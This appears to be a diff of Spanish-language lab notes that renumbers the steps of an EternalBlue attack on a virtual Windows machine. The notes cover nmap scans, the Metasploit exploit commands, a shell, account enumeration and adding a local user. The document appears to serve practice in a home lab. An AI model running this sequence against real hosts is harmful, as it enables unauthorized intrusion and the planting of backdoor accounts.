@@ -40,7 +40,7 @@ Resultados:
 
 ip de la maquina victima: 10.0.0.181
 
-nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.0.0.181
+4 nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.0.0.181
 
 Resultados:
 PORT      STATE SERVICE      VERSION
@@ -64,7 +64,7 @@ PORT      STATE SERVICE      REASON
 49158/tcp open  unknown      syn-ack ttl 128
 MAC Address: 08:00:27:BF:99:A9 (Oracle VirtualBox virtual NIC)
 ---------------------------------------------------------------
-4 Nmap -sCV -p 135,139,445,49158 10.0.0.181 -oN res-targeted
+5 Nmap -sCV -p 135,139,445,49158 10.0.0.181 -oN res-targeted
 
 Resultados:
 
@@ -90,7 +90,7 @@ Host script results:
 |   date: 2026-01-16T23:56:33
 |_  start_date: 2026-01-16T22:02:20
 
-5 nmap --script "vuln and safe" -p 445 10.0.0.181
+6 nmap --script "vuln and safe" -p 445 10.0.0.181
  Resultados:
 PORT    STATE SERVICE
 445/tcp open  microsoft-ds
@@ -112,7 +112,7 @@ Host script results:
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
 |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 
-6 msfconsole -q
+7 msfconsole -q
 
 Resultado:
 msf >
@@ -156,21 +156,21 @@ search eternalblue
 Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
 After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
 
-7 use 0
+8 use 0
 
-8 show options
+9 show options
 
-9 set RHOST 10.0.0.181
+10 set RHOST 10.0.0.181
 
-10 exploit
-11 shell
+11 exploit
+12 shell
 
-12 whoami
+13 whoami
 
-13 net user
-14 net localgroup
-15 ipconfig
-16 net user (nombre) (contra) /add
+14 net user
+15 net localgroup
+16 ipconfig
+17 net user (nombre) (contra) /add
 
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
